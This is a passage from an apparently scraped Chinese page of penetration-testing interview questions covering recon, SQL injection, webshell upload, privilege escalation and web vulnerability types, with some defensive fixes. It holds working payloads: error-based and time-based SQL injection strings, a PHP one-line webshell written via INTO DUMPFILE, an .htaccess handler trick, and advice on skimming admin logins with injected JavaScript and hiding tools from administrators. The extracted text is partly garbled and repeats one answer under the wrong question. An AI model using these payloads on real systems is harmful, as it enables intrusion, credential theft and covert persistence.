<p>篡改⽬标⽹站上的⽤户数据 盗取⽤户隐私数据 传播 CSRF 蠕 </p>
<h3 id="⼀、思路流程"><a href="#⼀、思路流程" class="headerlink" title="⼀、思路流程"></a>⼀、思路流程</h3><h4 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h4><p>a、服务器的相关信息（真实 ip，系统类型，版本，开放端⼝，WAF 等） </p>
<p>b、⽹站指纹识别（包括，cms，cdn，证书等），dns 记录 </p>
<p>c、whois 信息，姓名，备案，邮箱，电话反查（邮箱丢社⼯库，社⼯准备等） </p>
<p>e、⼦域名收集，旁站，C 段等 </p>
<p>f、google hacking 针对化搜索，pdf ⽂件，中间件版本，弱⼝令扫描等 </p>
<p>g、扫描⽹站⽬录结构，爆后台，⽹站 banner，测试⽂件，备份等敏感⽂件泄漏等 </p>
<p>h、传输协议，通⽤漏洞，exp，github 源码等 </p>
<h4 id="2、漏洞挖掘"><a href="#2、漏洞挖掘" class="headerlink" title="2、漏洞挖掘"></a>2、漏洞挖掘</h4><p>a、浏览⽹站，看看⽹站规模，功能，特点等 </p>
<p>b、端⼝，弱⼝令，⽬录等扫描, 对响应的端⼝进⾏漏洞探测，⽐如 rsync, ⼼脏出⾎，mysql,ftp,ssh 弱⼝令等。 </p>
<p>c、XSS，SQL 注⼊，上传，命令注⼊，CSRF，cookie 安全检测，敏感信息，通信数据传输，暴⼒破解，任意⽂件上 </p>
<p>传，越权访问，未授权访问，⽬录遍历，⽂件 包含，重放攻击（短信轰炸），服务器漏洞检测，最后使⽤漏扫⼯具等 </p>
<h4 id="3、漏洞利⽤-amp-权限提升"><a href="#3、漏洞利⽤-amp-权限提升" class="headerlink" title="3、漏洞利⽤ &amp; 权限提升"></a>3、漏洞利⽤ &amp; 权限提升</h4><p>a mysql 提权 serv u 提权 oracle 提权a、mysql 提权，serv-u 提权，oracle 提权 </p>
<p>b、windows 溢出提权 </p>
<p>c、linux 脏⽜, 内核漏洞提权 e </p>
<h4 id="4、清除测试数据-amp-输出报告"><a href="#4、清除测试数据-amp-输出报告" class="headerlink" title="4、清除测试数据 &amp; 输出报告"></a>4、清除测试数据 &amp; 输出报告</h4><p>⽇志、测试数据的清理 </p>
<p>总结，输出渗透测试报告，附修复⽅案 </p>
<h4 id="5、复测"><a href="#5、复测" class="headerlink" title="5、复测"></a>5、复测</h4><p>验证并发现是否有新漏洞，输出报告，归档 </p>
<h3 id="⼆、问题"><a href="#⼆、问题" class="headerlink" title="⼆、问题"></a>⼆、问题</h3><h4 id="1、拿到⼀个待检测的站，你觉得应该先做什么？"><a href="#1、拿到⼀个待检测的站，你觉得应该先做什么？" class="headerlink" title="1、拿到⼀个待检测的站，你觉得应该先做什么？"></a>1、拿到⼀个待检测的站，你觉得应该先做什么？</h4><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>a、获取域名的 whois 信息, 获取注册者邮箱姓名电话等，丢社⼯库⾥看看有没有泄露密码，然后尝试⽤泄露的密码进⾏ </p>
<p>登录后台。⽤邮箱做关键词进⾏丢进搜索引擎。利⽤搜索到的关联信息找出其他邮箱进⽽得到常⽤社交账号。社⼯找出 </p>
<p>社交账号，⾥⾯或许会找出管理员设置密码的习惯 。利⽤已有信息⽣成专⽤字典。 </p>
<p>b、查询服务器旁站以及⼦域名站点，因为主站⼀般⽐较难，所以先看看旁站有没有通⽤性的 cms 或者其他漏洞。 </p>
<p>c、查看服务器操作系统版本，web 中间件，看看是否存在已知的漏洞，⽐如 IIS，APACHE,NGINX 的解析漏洞 </p>
<p>d、查看 IP，进⾏ IP 地址端⼝扫描，对响应的端⼝进⾏漏洞探测，⽐如 rsync, ⼼脏出⾎，mysql,ftp,ssh 弱⼝令等。 </p>
<p>e、扫描⽹站⽬录结构，看看是否可以遍历⽬录，或者敏感⽂件泄漏，⽐如 php 探针 </p>
<p>f、google hack 进⼀步探测⽹站的信息，后台，敏感⽂件 </p>
<h5 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h5><p>开始检测漏洞 如 XSS XSRF sql 注⼊ 代码执⾏ 命令执⾏ 越权访问 ⽬录读取 任意⽂件读取 下载 ⽂件包含开始检测漏洞，如 XSS,XSRF,sql 注⼊，代码执⾏，命令执⾏，越权访问，⽬录读取，任意⽂件读取，下载，⽂件包含， </p>
<p>远程命令执⾏，弱⼝令，上传，编辑器漏洞，暴⼒破解等 </p>
<h5 id="漏洞利⽤"><a href="#漏洞利⽤" class="headerlink" title="漏洞利⽤"></a>漏洞利⽤</h5><p>利⽤以上的⽅式拿到 webshell，或者其他权限 </p>
<h5 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h5><p>提权服务器，⽐如 windows 下 mysql 的 udf 提权，serv-u 提权，windows 低版本的漏洞，如 iis6,pr, 巴⻄烤⾁，linux </p>
<p>脏⽜漏洞，linux 内核版本漏洞提权，linux 下的 mysql system 提权以及 oracle 低权限提权 </p>
<h5 id="⽇志清理"><a href="#⽇志清理" class="headerlink" title="⽇志清理"></a>⽇志清理</h5><h5 id="总结报告及修复⽅案"><a href="#总结报告及修复⽅案" class="headerlink" title="总结报告及修复⽅案"></a>总结报告及修复⽅案</h5><h4 id="2、判断出⽹站的-CMS-对渗透有什么意义？"><a href="#2、判断出⽹站的-CMS-对渗透有什么意义？" class="headerlink" title="2、判断出⽹站的 CMS 对渗透有什么意义？"></a>2、判断出⽹站的 CMS 对渗透有什么意义？</h4><p>查找⽹上已曝光的程序漏洞。 </p>
<p>如果开源，还能下载相对应的源码进⾏代码审计。 </p>
<h4 id="3-⼀个成熟并且相对安全的-CMS，渗透时扫⽬录的意义？"><a href="#3-⼀个成熟并且相对安全的-CMS，渗透时扫⽬录的意义？" class="headerlink" title="3. ⼀个成熟并且相对安全的 CMS，渗透时扫⽬录的意义？"></a>3. ⼀个成熟并且相对安全的 CMS，渗透时扫⽬录的意义？</h4><p>敏感⽂件、⼆级⽬录扫描 </p>
<p>站⻓的误操作⽐如：⽹站备份的压缩⽂件、说明. txt、⼆级⽬录可能存放着其他站点 </p>
<h4 id="4-常⻅的⽹站服务器容器。"><a href="#4-常⻅的⽹站服务器容器。" class="headerlink" title="4.常⻅的⽹站服务器容器。"></a>4.常⻅的⽹站服务器容器。</h4><p>IIS、Apache、nginx、Lighttpd、Tomcat </p>
<h4 id="5-mysql-注⼊点，⽤⼯具对⽬标站直接写⼊⼀句话，需要哪些条件？"><a href="#5-mysql-注⼊点，⽤⼯具对⽬标站直接写⼊⼀句话，需要哪些条件？" class="headerlink" title="5.mysql 注⼊点，⽤⼯具对⽬标站直接写⼊⼀句话，需要哪些条件？"></a>5.mysql 注⼊点，⽤⼯具对⽬标站直接写⼊⼀句话，需要哪些条件？</h4><p>以 站的绝对路root 权限以及⽹站的绝对路径。 </p>
<h4 id="6-⽬前已知哪些版本的容器有解析漏洞，具体举例。"><a href="#6-⽬前已知哪些版本的容器有解析漏洞，具体举例。" class="headerlink" title="6.⽬前已知哪些版本的容器有解析漏洞，具体举例。"></a>6.⽬前已知哪些版本的容器有解析漏洞，具体举例。</h4><p>a、IIS 6.0</p>
<p>/xx.asp/xx.jpg “xx.asp” 是⽂件夹名 </p>
<p>b、IIS 7.0/7.5 </p>
<p>默认 Fast-CGI 开启，直接在 url 中图⽚地址后⾯输⼊ / 1.php，会把正常图⽚当成 php 解析 </p>
<p>c、Nginx </p>
<p>版本⼩于等于 0.8.37，利⽤⽅法和 IIS 7.0/7.5 ⼀样，Fast-CGI 关闭情况下也可利⽤。空字节代码 xxx.jpg.php </p>
<p>d、Apache 上传的⽂件命名为：test.php.x1.x2.x3，Apache 是从右往左判断后缀 </p>
<p>e、lighttpd xx.jpg/xx.php，不全, 请⼩伙伴们在评论处不吝补充，谢谢！ </p>
<ol start="7">
<li><h4 id="如何⼿⼯快速判断⽬标站是-windows-还是-linux-服务器？"><a href="#如何⼿⼯快速判断⽬标站是-windows-还是-linux-服务器？" class="headerlink" title="如何⼿⼯快速判断⽬标站是 windows 还是 linux 服务器？"></a>如何⼿⼯快速判断⽬标站是 windows 还是 linux 服务器？</h4></li>
</ol>
<p>linux ⼤⼩写敏感, windows ⼤⼩写不敏感。 </p>
<h4 id="8-为何⼀个-mysql-数据库的站，只有⼀个-80-端⼝开放？"><a href="#8-为何⼀个-mysql-数据库的站，只有⼀个-80-端⼝开放？" class="headerlink" title="8. 为何⼀个 mysql 数据库的站，只有⼀个 80 端⼝开放？"></a>8. 为何⼀个 mysql 数据库的站，只有⼀个 80 端⼝开放？</h4><p>更改了端⼝，没有扫描出来。 </p>
<p>站库分离。 </p>
<p>3306 端⼝不对外开放 </p>
<h4 id="9、3389-⽆法连接的⼏种情况"><a href="#9、3389-⽆法连接的⼏种情况" class="headerlink" title="9、3389 ⽆法连接的⼏种情况"></a>9、3389 ⽆法连接的⼏种情况</h4><p>没开放 3389 端⼝ </p>
<p>端⼝被修改防护拦截</p>
<p>处于内⽹ (需进⾏端⼝转发) </p>
<h4 id="10-如何突破注⼊时字符被转义？"><a href="#10-如何突破注⼊时字符被转义？" class="headerlink" title="10. 如何突破注⼊时字符被转义？"></a>10. 如何突破注⼊时字符被转义？</h4><p>宽字符注⼊ </p>
<p>hex 编码绕过 </p>
<h4 id="11-在某后台新闻编辑界⾯看到编辑器，应该先做什么？"><a href="#11-在某后台新闻编辑界⾯看到编辑器，应该先做什么？" class="headerlink" title="11. 在某后台新闻编辑界⾯看到编辑器，应该先做什么？"></a>11. 在某后台新闻编辑界⾯看到编辑器，应该先做什么？</h4><p>查看编辑器的名称版本, 然后搜索公开的漏洞。 </p>
<h4 id="12-拿到⼀个-webshell-发现⽹站根⽬录下有-htaccess-⽂件，我们能做什么？"><a href="#12-拿到⼀个-webshell-发现⽹站根⽬录下有-htaccess-⽂件，我们能做什么？" class="headerlink" title="12. 拿到⼀个 webshell 发现⽹站根⽬录下有. htaccess ⽂件，我们能做什么？"></a>12. 拿到⼀个 webshell 发现⽹站根⽬录下有. htaccess ⽂件，我们能做什么？</h4><p>能做的事情很多，⽤隐藏⽹⻢来举例⼦： </p>
<p>插⼊</p>
<p>&lt;FilesMatch “xxx.jpg”&gt; SetHandler application/x-httpd-php </p>
<p>.jpg ⽂件会被解析成. php ⽂件。 </p>
<p>具体其他的事情，不好详说，建议⼤家⾃⼰去搜索语句来玩玩。 </p>
<h4 id="13-注⼊漏洞只能查账号密码？"><a href="#13-注⼊漏洞只能查账号密码？" class="headerlink" title="13. 注⼊漏洞只能查账号密码？"></a>13. 注⼊漏洞只能查账号密码？</h4><p>只要权限⼴，拖库脱到⽼。 </p>
<h4 id="14-安全狗会追踪变量，从⽽发现出是⼀句话⽊⻢吗？"><a href="#14-安全狗会追踪变量，从⽽发现出是⼀句话⽊⻢吗？" class="headerlink" title="14. 安全狗会追踪变量，从⽽发现出是⼀句话⽊⻢吗？"></a>14. 安全狗会追踪变量，从⽽发现出是⼀句话⽊⻢吗？</h4><p>是根据特征码，所以很好绕过了，只要思路宽，绕狗绕到欢，但这应该不会是⼀成不变的。 </p>
<h4 id="15-access-扫出后缀为-asp-的数据库⽂件，访问乱码，-如何实现到本地利⽤？"><a href="#15-access-扫出后缀为-asp-的数据库⽂件，访问乱码，-如何实现到本地利⽤？" class="headerlink" title="15.access 扫出后缀为 asp 的数据库⽂件，访问乱码， 如何实现到本地利⽤？"></a><strong>15.access 扫出后缀为 asp 的数据库⽂件，访问乱码，</strong> 如何实现到本地利⽤？</h4><p>迅雷下载，直接改后缀为. mdb。 </p>
<h4 id="16-提权时选择可读写⽬录，为何尽量不⽤带空格的⽬录？因为-exp-执⾏多半需要空格界定参数"><a href="#16-提权时选择可读写⽬录，为何尽量不⽤带空格的⽬录？因为-exp-执⾏多半需要空格界定参数" class="headerlink" title="16. 提权时选择可读写⽬录，为何尽量不⽤带空格的⽬录？因为 exp 执⾏多半需要空格界定参数"></a>16. 提权时选择可读写⽬录，为何尽量不⽤带空格的⽬录？因为 exp 执⾏多半需要空格界定参数</h4><h4 id="17-某服务器有站点-A-B-为何在-A-的后台添加-test-⽤户，访问-B-的后台。发现也添加上了-test-⽤户？"><a href="#17-某服务器有站点-A-B-为何在-A-的后台添加-test-⽤户，访问-B-的后台。发现也添加上了-test-⽤户？" class="headerlink" title="17. 某服务器有站点 A,B 为何在 A 的后台添加 test ⽤户，访问 B 的后台。发现也添加上了 test ⽤户？"></a>17. 某服务器有站点 A,B 为何在 A 的后台添加 test ⽤户，访问 B 的后台。发现也添加上了 test ⽤户？</h4><p>同数据库。 </p>
<h4 id="18-注⼊时可以不使⽤-and-或-or-或-xor，直接-order-by-开始注⼊吗？"><a href="#18-注⼊时可以不使⽤-and-或-or-或-xor，直接-order-by-开始注⼊吗？" class="headerlink" title="18. 注⼊时可以不使⽤ and 或 or 或 xor，直接 order by 开始注⼊吗？"></a>18. 注⼊时可以不使⽤ and 或 or 或 xor，直接 order by 开始注⼊吗？</h4><p>and/or/xor，前⾯的 1=1、1=2 步骤只是为了判断是否为注⼊点，如果已经确定是注⼊点那就可以省那步骤去。 </p>
<h4 id="19-某个防注⼊系统，在注⼊时会提示："><a href="#19-某个防注⼊系统，在注⼊时会提示：" class="headerlink" title="19: 某个防注⼊系统，在注⼊时会提示："></a>19: 某个防注⼊系统，在注⼊时会提示：</h4><p>系统检测到你有⾮法注⼊的⾏为。 </p>
<p>已记录您的 ip xx.xx.xx.xx </p>
<p>时间: 2016:01-23 </p>
<p>提交⻚⾯: test.asp?id=15 </p>
<p>提交内容: and 1=1 </p>
<h4 id="20、如何利⽤这个防注⼊系统拿-shell？"><a href="#20、如何利⽤这个防注⼊系统拿-shell？" class="headerlink" title="20、如何利⽤这个防注⼊系统拿 shell？"></a>20、如何利⽤这个防注⼊系统拿 shell？</h4><p>在 URL ⾥⾯直接提交⼀句话，这样⽹站就把你的⼀句话也记录进数据库⽂件了 这个时候可以尝试寻找⽹站的配置⽂件 </p>
<p>直接上菜⼑链接。 </p>
<h4 id="21-上传⼤⻢后访问乱码时，有哪些解决办法？"><a href="#21-上传⼤⻢后访问乱码时，有哪些解决办法？" class="headerlink" title="21. 上传⼤⻢后访问乱码时，有哪些解决办法？"></a>21. 上传⼤⻢后访问乱码时，有哪些解决办法？</h4><p>浏览器中改编码。 </p>
<h4 id="22-审查上传点的元素有什么意义？"><a href="#22-审查上传点的元素有什么意义？" class="headerlink" title="22. 审查上传点的元素有什么意义？"></a>22. 审查上传点的元素有什么意义？</h4><p>有些站点的上传⽂件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。 </p>
<h4 id="23-⽬标站禁⽌注册⽤户，找回密码处随便输⼊⽤户名提示："><a href="#23-⽬标站禁⽌注册⽤户，找回密码处随便输⼊⽤户名提示：" class="headerlink" title="23. ⽬标站禁⽌注册⽤户，找回密码处随便输⼊⽤户名提示："></a>23. ⽬标站禁⽌注册⽤户，找回密码处随便输⼊⽤户名提示：</h4><p>“</p>
<p>此⽤户不存在</p>
<p>”</p>
<p>，你觉得这⾥怎样利⽤？先爆破⽤户名，再利⽤被爆破出来的⽤户名爆破密码。 </p>
<p>其实有些站点，在登陆处也会这样提示 </p>
<p>所有和数据库有交互的地⽅都有可能有注⼊。 </p>
<h4 id="24-⽬标站发现某-txt-的下载地址为"><a href="#24-⽬标站发现某-txt-的下载地址为" class="headerlink" title="24. ⽬标站发现某 txt 的下载地址为"></a>24. ⽬标站发现某 txt 的下载地址为</h4><p><a href="http://www.test.com/down/down.php?fifile=/upwdown/1.txt，你有什么思路？">http://www.test.com/down/down.php?fifile=/upwdown/1.txt，你有什么思路？</a> </p>
<p>这就是传说中的下载漏洞！在 fifile = 后⾯尝试输⼊ index.php 下载他的⾸⻚⽂件，然后在⾸⻚⽂件⾥继续查找其他⽹站 </p>
<p>的配置⽂件，可以找出⽹站的数据库密码和数据库的地址。 </p>
<h4 id="25-甲给你⼀个⽬标站，并且告诉你根⽬录下存在-abc-⽬录，并且此⽬录下存在编辑器和-admin-⽬录。请问你的想"><a href="#25-甲给你⼀个⽬标站，并且告诉你根⽬录下存在-abc-⽬录，并且此⽬录下存在编辑器和-admin-⽬录。请问你的想" class="headerlink" title="25. 甲给你⼀个⽬标站，并且告诉你根⽬录下存在 / abc / ⽬录，并且此⽬录下存在编辑器和 admin ⽬录。请问你的想"></a>25. 甲给你⼀个⽬标站，并且告诉你根⽬录下存在 / abc / ⽬录，并且此⽬录下存在编辑器和 admin ⽬录。请问你的想</h4><p>法是？ </p>
<p>直接在⽹站⼆级⽬录 / abc / 下扫描敏感⽂件及⽬录。 </p>
<h4 id="26-在有-shell-的情况下，如何使⽤-xss-实现对⽬标站的⻓久控制？"><a href="#26-在有-shell-的情况下，如何使⽤-xss-实现对⽬标站的⻓久控制？" class="headerlink" title="26. 在有 shell 的情况下，如何使⽤ xss 实现对⽬标站的⻓久控制？"></a>26. 在有 shell 的情况下，如何使⽤ xss 实现对⽬标站的⻓久控制？</h4><p>后台登录处加⼀段记录登录账号密码的 js，并且判断是否登录成功，如果登录成功，就把账号密码记录到⼀个⽣僻的路 </p>
<p>径的⽂件中或者直接发到⾃⼰的⽹站⽂件中。(此⽅法适合有价值并且需要深⼊控制权限的⽹络)。 </p>
<p>在登录后才可以访问的⽂件中插⼊ XSS 脚本。 </p>
<h4 id="27-后台修改管理员密码处，原密码显示为-。你觉得该怎样实现读出这个⽤户的密码？"><a href="#27-后台修改管理员密码处，原密码显示为-。你觉得该怎样实现读出这个⽤户的密码？" class="headerlink" title="27. 后台修改管理员密码处，原密码显示为 *。你觉得该怎样实现读出这个⽤户的密码？"></a>27. 后台修改管理员密码处，原密码显示为 *。你觉得该怎样实现读出这个⽤户的密码？</h4><p>审查元素 把密码处的 password 属性改成 text 就明⽂显示了 </p>
<h4 id="28-⽬标站⽆防护，上传图⽚可以正常访问，上传脚本格式访问则-403-什么原因？"><a href="#28-⽬标站⽆防护，上传图⽚可以正常访问，上传脚本格式访问则-403-什么原因？" class="headerlink" title="28. ⽬标站⽆防护，上传图⽚可以正常访问，上传脚本格式访问则 403. 什么原因？"></a>28. ⽬标站⽆防护，上传图⽚可以正常访问，上传脚本格式访问则 403. 什么原因？</h4><p>原因很多，有可能 web 服务器配置把上传⽬录写死了不执⾏相应脚本，尝试改后缀名绕过 </p>
<h4 id="29-审查元素得知⽹站所使⽤的防护软件，你觉得怎样做到的？"><a href="#29-审查元素得知⽹站所使⽤的防护软件，你觉得怎样做到的？" class="headerlink" title="29. 审查元素得知⽹站所使⽤的防护软件，你觉得怎样做到的？"></a>29. 审查元素得知⽹站所使⽤的防护软件，你觉得怎样做到的？</h4><p>在敏感操作被拦截，通过界⾯信息⽆法具体判断是什么防护的时候，F12 看 HTML 体部 ⽐如护卫神就可以在名称那看到内容。 </p>
<h4 id="30-在-win2003-服务器中建⽴⼀个-zhongzi-⽂件夹⽤意何为？"><a href="#30-在-win2003-服务器中建⽴⼀个-zhongzi-⽂件夹⽤意何为？" class="headerlink" title="30. 在 win2003 服务器中建⽴⼀个 .zhongzi ⽂件夹⽤意何为？"></a>30. 在 win2003 服务器中建⽴⼀个 .zhongzi ⽂件夹⽤意何为？</h4><p>隐藏⽂件夹，为了不让管理员发现你传上去的⼯具。 </p>
<h4 id="31、sql-注⼊有以下两个测试选项，选⼀个并且阐述不选另⼀个的理由："><a href="#31、sql-注⼊有以下两个测试选项，选⼀个并且阐述不选另⼀个的理由：" class="headerlink" title="31、sql 注⼊有以下两个测试选项，选⼀个并且阐述不选另⼀个的理由："></a>31、sql 注⼊有以下两个测试选项，选⼀个并且阐述不选另⼀个的理由：</h4><p>A. demo.jsp?id=2+1 </p>
<p>B. demo.jsp?id=2-1 </p>
<p>选 B，在 URL 编码中 + 代表空格，可能会造成混淆</p>
<h4 id="32、以下链接存在-sql-注⼊漏洞，对于这个变形注⼊，你有什么思路？"><a href="#32、以下链接存在-sql-注⼊漏洞，对于这个变形注⼊，你有什么思路？" class="headerlink" title="32、以下链接存在 sql 注⼊漏洞，对于这个变形注⼊，你有什么思路？"></a>32、以下链接存在 sql 注⼊漏洞，对于这个变形注⼊，你有什么思路？</h4><p>demo.do?DATA=AjAxNg== </p>
<p>DATA 有可能经过了 base64 编码再传⼊服务器，所以我们也要对参数进⾏ base64 编码才能正确完成测试 </p>
<h4 id="33、发现-demo-jsp-uid-110-注⼊点，你有哪⼏种思路获取-webshell，哪种是优选？"><a href="#33、发现-demo-jsp-uid-110-注⼊点，你有哪⼏种思路获取-webshell，哪种是优选？" class="headerlink" title="33、发现 demo.jsp?uid=110 注⼊点，你有哪⼏种思路获取 webshell，哪种是优选？"></a>33、发现 demo.jsp?uid=110 注⼊点，你有哪⼏种思路获取 webshell，哪种是优选？</h4><p>有写⼊权限的，构造联合查询语句使⽤ using INTO OUTFILE，可以将查询的输出重定向到系统的⽂件中，这样去写⼊</p>
<p>WebShell 使⽤ sqlmap –os-shell 原理和上⾯⼀种相同，来直接获得⼀个 Shell，这样效率更⾼ 通过构造联合查询语句 </p>
<p>得到⽹站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等⽅法上传 Shell </p>
<h4 id="34、CSRF-和-XSS-和-XXE-有什么区别，以及修复⽅式？"><a href="#34、CSRF-和-XSS-和-XXE-有什么区别，以及修复⽅式？" class="headerlink" title="34、CSRF 和 XSS 和 XXE 有什么区别，以及修复⽅式？"></a>34、CSRF 和 XSS 和 XXE 有什么区别，以及修复⽅式？</h4><p>XSS 是跨站脚本攻击，⽤户提交的数据中可以构造代码来执⾏，从⽽实现窃取⽤户信息等攻击。修复⽅式：对字符实体 </p>
<p>进⾏转义、使⽤ HTTP Only 来禁⽌ JavaScript 读取 Cookie 值、输⼊时校验、浏览器与 Web 应⽤端采⽤相同的字符编 </p>
<p>码。</p>
<p>CSRF 是跨站请求伪造攻击，XSS 是实现 CSRF 的诸多⼿段中的⼀种，是由于没有在关键操作执⾏时进⾏是否由⽤户⾃ </p>
<p>愿发起的确认。修复⽅式：筛选出需要防范 CSRF 的⻚⾯然后嵌⼊ Token、再次输⼊密码、检验 Referer XXE 是 XML </p>
<p>外部实体注⼊攻击，XML 中可以通过调⽤实体来请求本地或者远程内容，和远程⽂件保护类似，会引发相关安全问题，例如敏感⽂件读取。修复⽅式：XML 解析库在调⽤时严格禁⽌对外部实体的解析。 </p>
<h4 id="35、CSRF、SSRF-和重放攻击有什么区别？"><a href="#35、CSRF、SSRF-和重放攻击有什么区别？" class="headerlink" title="35、CSRF、SSRF 和重放攻击有什么区别？"></a>35、CSRF、SSRF 和重放攻击有什么区别？</h4><p>CSRF 是跨站请求伪造攻击，由客户端发起 SSRF 是服务器端请求伪造，由服务器发起 重放攻击是将截获的数据包进⾏ </p>
<p>重放，达到身份认证等⽬的</p>
<h4 id="36、说出⾄少三种业务逻辑漏洞，以及修复⽅式？"><a href="#36、说出⾄少三种业务逻辑漏洞，以及修复⽅式？" class="headerlink" title="36、说出⾄少三种业务逻辑漏洞，以及修复⽅式？"></a>36、说出⾄少三种业务逻辑漏洞，以及修复⽅式？</h4><p>密码找回漏洞中存在 </p>
<p>1）密码允许暴⼒破解、 </p>
<p>2）存在通⽤型找回凭证、 </p>
<p>3）可以跳过验证步骤、 </p>
<p>4）找回凭证可以拦包获取 </p>
<p>等⽅式来通过⼚商提供的密码找回功能来得到密码。身份认证漏洞中最常⻅的是 </p>
<p>1）会话固定攻击 </p>
<p>2） Cookie 仿冒 </p>
<p>只要得到 Session 或 Cookie 即可伪造⽤户身份。验证码漏洞中存在 </p>
<p>1）验证码允许暴⼒破解 </p>
<p>2）验证码可以通过 Javascript 或者改包的⽅法来进⾏绕过 </p>
<h4 id="37、圈出下⾯会话中可能存在问题的项，并标注可能会存在的问题？"><a href="#37、圈出下⾯会话中可能存在问题的项，并标注可能会存在的问题？" class="headerlink" title="37、圈出下⾯会话中可能存在问题的项，并标注可能会存在的问题？"></a>37、圈出下⾯会话中可能存在问题的项，并标注可能会存在的问题？</h4><p>get /ecskins/demo jsp?uid=2016031900&amp;keyword=”hello world”get /ecskins/demo.jsp?uid=2016031900&amp;keyword= hello world</p>
<p>HTTP/1.1Host:***.com:82User-Agent:Mozilla/</p>
<p>5.0 Firefox/40Accept:text/css,/;q=0.1</p>
<p>Accept-Language:zh-CN;zh;q=0.8;en-US;q=0.5,en;q=0.3</p>
<p>Referer:http://<strong>***</strong>.com/eciop/orderForCC/</p>
<p>cgtListForCC.htm?zone=11370601&amp;v=145902</p>
<p>Cookie:myguid1234567890=1349db5fe50c372c3d995709f54c273d;</p>
<p>uniqueserid=session_OGRMIFIYJHAH5_HZRQOZAMHJ;</p>
<p>st_uid=N90PLYHLZGJXI-NX01VPUF46W;</p>
<p>status=True</p>
<p>Connection:keep-alive</p>
<p>有写⼊权限的，构造联合查询语句使⽤ using INTO OUTFILE，可以将查询的输出重定向到系统的⽂件中，这样去写⼊</p>
<p>WebShell 使⽤ sqlmap –os-shell 原理和上⾯⼀种相同，来直接获得⼀个 Shell，这样效率更⾼ 通过构造联合查询语句 </p>
<p>得到⽹站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等⽅法上传 Shell </p>
<h4 id="38、给你⼀个⽹站你是如何来渗透测试的-在获取书⾯授权的前提下。"><a href="#38、给你⼀个⽹站你是如何来渗透测试的-在获取书⾯授权的前提下。" class="headerlink" title="38、给你⼀个⽹站你是如何来渗透测试的? 在获取书⾯授权的前提下。"></a>38、给你⼀个⽹站你是如何来渗透测试的? 在获取书⾯授权的前提下。</h4><h4 id="39、sqlmap，怎么对⼀个注⼊点注⼊？"><a href="#39、sqlmap，怎么对⼀个注⼊点注⼊？" class="headerlink" title="39、sqlmap，怎么对⼀个注⼊点注⼊？"></a>39、sqlmap，怎么对⼀个注⼊点注⼊？</h4><p>1）如果是 get 型号，直接，sqlmap -u “诸如点⽹址”. </p>
<p>2) 如果是 post 型诸如点，可以 sqlmap -u “注⼊点⽹址” –data=”post 的参数 “ </p>
<p>3）如果是 cookie，X-Forwarded-For 等，可以访问的时候，⽤ burpsuite 抓包，注⼊处⽤号替换，放到⽂件⾥，然后 </p>
<p>sqlmap -r “⽂件地址” </p>
<h4 id="40、nmap，扫描的⼏种⽅式"><a href="#40、nmap，扫描的⼏种⽅式" class="headerlink" title="40、nmap，扫描的⼏种⽅式"></a>40、nmap，扫描的⼏种⽅式</h4><h4 id="41、sql-注⼊的⼏种类型？"><a href="#41、sql-注⼊的⼏种类型？" class="headerlink" title="41、sql 注⼊的⼏种类型？"></a>41、sql 注⼊的⼏种类型？</h4><p>1）报错注⼊ </p>
<p>2）bool 型注⼊ </p>
<p>3）延时注⼊ </p>
<p>4）宽字节注⼊ </p>
<h4 id="42、报错注⼊的函数有哪些？10-个"><a href="#42、报错注⼊的函数有哪些？10-个" class="headerlink" title="42、报错注⼊的函数有哪些？10 个"></a>42、报错注⼊的函数有哪些？10 个</h4><p>1）and extractvalue(1, concat(0x7e,(select @@version),0x7e))】】】</p>
<p>2）通过floor报错 向下取整3）+and updatexml(1, concat(0x7e,(secect @@version),0x7e),1) </p>
<p>4）.geometrycollection()select from test where id=1 and geometrycollection((select from(selectfrom(select user())a)</p>
<p>b));</p>
<p>5）.multipoint()select from test where id=1 and multipoint((select from(select from(select user())a)b));</p>
<p>6）.polygon()select from test where id=1 and polygon((select from(select from(select user())a)b));</p>
<p>7）.multipolygon()select from test where id=1 and multipolygon((select from(select from(select user())a)b));</p>
<p>8）.linestring()select from test where id=1 and linestring((select from(select from(select user())a)b));</p>
<p>9）.multilinestring()select from test where id=1 and multilinestring((select from(select from(select user())a)b));</p>
<p>10）.exp()select from test where id=1 and exp(~(select * from(select user())a));</p>
<h4 id="43、延时注⼊如何来判断？"><a href="#43、延时注⼊如何来判断？" class="headerlink" title="43、延时注⼊如何来判断？"></a>43、延时注⼊如何来判断？</h4><p>if(ascii(substr(“hello”, 1, 1))=104, sleep(5), 1) </p>
<h4 id="44、盲注和延时注⼊的共同点？"><a href="#44、盲注和延时注⼊的共同点？" class="headerlink" title="44、盲注和延时注⼊的共同点？"></a>44、盲注和延时注⼊的共同点？</h4><p>都是⼀个字符⼀个字符的判断 </p>
<h4 id="45、如何拿⼀个⽹站的-webshell？上传，后台编辑模板，sql-注⼊写⽂件，命令执⾏，代码执⾏，-⼀些已经爆出的-cms"><a href="#45、如何拿⼀个⽹站的-webshell？上传，后台编辑模板，sql-注⼊写⽂件，命令执⾏，代码执⾏，-⼀些已经爆出的-cms" class="headerlink" title="45、如何拿⼀个⽹站的 webshell？上传，后台编辑模板，sql 注⼊写⽂件，命令执⾏，代码执⾏， ⼀些已经爆出的 cms"></a>45、如何拿⼀个⽹站的 webshell？上传，后台编辑模板，sql 注⼊写⽂件，命令执⾏，代码执⾏， ⼀些已经爆出的 cms</h4><p>漏洞，⽐如 dedecms 后台可以直接建⽴脚本⽂件，wordpress 上传插件包含脚本⽂件 zip 压缩包等 </p>
<h4 id="46、sql-注⼊写⽂件都有哪些函数？"><a href="#46、sql-注⼊写⽂件都有哪些函数？" class="headerlink" title="46、sql 注⼊写⽂件都有哪些函数？"></a>46、sql 注⼊写⽂件都有哪些函数？</h4><p>select ‘⼀句话’ into outfile ‘路径’</p>
<p>select ‘⼀句话’ into dumpfile ‘路径’</p>
<p>select ‘<?php eval($_POST[1]) ?>‘ into dumpfile ‘d:\wwwroot\baidu.com\nvhack.php’; </p>
<h4 id="47、如何防⽌-CSRF"><a href="#47、如何防⽌-CSRF" class="headerlink" title="47、如何防⽌ CSRF?"></a>47、如何防⽌ CSRF?</h4><p>1）验证 referer </p>
<p>2）验证 token </p>
